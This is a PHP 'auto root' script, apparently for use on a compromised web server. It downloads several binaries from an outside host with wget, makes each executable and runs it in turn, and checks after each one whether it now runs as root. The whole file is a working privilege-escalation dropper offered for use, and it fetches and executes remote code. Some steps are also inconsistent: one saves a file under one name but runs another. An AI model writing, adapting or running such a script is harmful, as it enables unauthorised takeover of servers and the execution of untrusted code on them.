<?php
echo "
####################################
Auto Root Coded by Moroccanwolf
2012-2013-2014-2015
facebook.com/Mwolfprogrammer
#####################################
";
@mkdir(mwolfroot);
@chdir(mwolfroot);


#################################################################


$sys = system("wget http://www.sistemasi.com.mx/sites/a.txt -O a.out");


echo "[+] Trying a.out ...";
exec("chmod +x a.out");
exec("./a.out");
if(get_current_user() == 'root'){
 
    die("[+] Rooted ./Done [a.out]");
}



#################################################################


$sys = system("wget http://www.sistemasi.com.mx/sites/sec.txt -O sec.out");

if ($sys == 1 ){

echo "[+] Trying sec.out ...";
exec("chmod +x sec.out");
exec("./sec.out");
if(get_current_user() == 'root'){
 
    die("[+] Rooted ./Done [sec.out]");
}

}
#################################################################


$sys = system("wget http://www.sistemasi.com.mx/sites/trolled.txt -O trolled");
if ($sys == 1 ){
echo "[+] Trying trolled ...";
exec("chmod +x trolled.out");
exec("./trolled.out");
if(get_current_user() == 'root'){
 
    die("[+] Rooted ./Done [trolled]");
}


}

#################################################################


$sys = system("wget http://www.sistemasi.com.mx/sites/pcp2015.txt -O pcp2015.out");
if ($sys == 1 ){
echo "[+] Trying pcp2015.out ...";
exec("chmod +x pcp2015.out");
exec("./pcp2015.out");

if(get_current_user() == 'root'){
 
    die("[+] Rooted ./Done [pcp2015.out]");
}

}
#################################################################


$sys = system("wget http://www.sistemasi.com.mx/sites/X.txt -O X.out");
if ($sys == 1 ){

echo "[+] Trying X.out ...";

exec("chmod +x X.out");
exec("./X.out");

if(get_current_user() == 'root'){
 
    die("[+] Rooted ./Done [X.out]");
}

}

?>
